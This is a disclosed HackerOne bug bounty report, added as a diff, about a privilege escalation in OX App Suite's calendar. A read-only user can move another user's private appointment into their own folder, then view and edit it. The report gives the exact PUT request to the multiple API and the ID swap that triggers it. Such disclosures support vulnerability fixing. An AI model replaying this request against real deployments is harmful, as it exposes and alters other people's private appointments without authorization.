@@ -1,0 +1,45 @@
+ReportLink:https://hackerone.com/reports/220874
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/vijay_kumar1110
+ReportedTo:OX App Suite(appsuite)
+BountyAmount:200.0
+Severity:critical
+State:Closed
+DateOfDisclosure:17.08.2017 20:45:02
+
+Summary:
+
+Hi Team,
+
+Description : Read only user of calendar folder shouldn't be able access any private appointments. I have found a move calendar folder request which is working for read only user. Once Attacker moves the appointment to his folder , then he can Access private appointments.
+
+Vulnerable HTTP request : 
+
+PUT /appsuite/api/multiple?session=[session_token] HTTP/1.1
+Host: sandbox.open-xchange.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Content-Type: text/javascript; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://sandbox.open-xchange.com/appsuite/
+Content-Length: 113
+Cookie: [cookie_values]
+Connection: close
+
+[{"action":"update","id":[appointmentID],"folder":[Current_Folder_ID],"timestamp":1492114513233,"module":"calendar","data":{"folder_id":"[Target_folder_ID]"}}]
+
+Here you need to keep the Current_Folder_ID and Target_folder_ID of you own calendars where you are admin . you just need to change appointmentID to private appointmentID where you are read only user. This request will be accepted by server and appointment will be added into your target calendar folderID. Once appointment is added into your folder you will be able to View all it's content and Edit it. 
+
+Actual problem  : When you move the appointment , the appointment is copied with same appointmenID which leads to this attack . 
+
+Issues : 
+1.You can view appointment it's attachments and members etc.
+2.You can change the status of appointment.
+3.You can edit the details of calendar. 
+4.You can move the calendar .
+
+Let me know if you require Steps or Video POC for this issue. 
+
+Best Regards !
+Vijay Kumar 
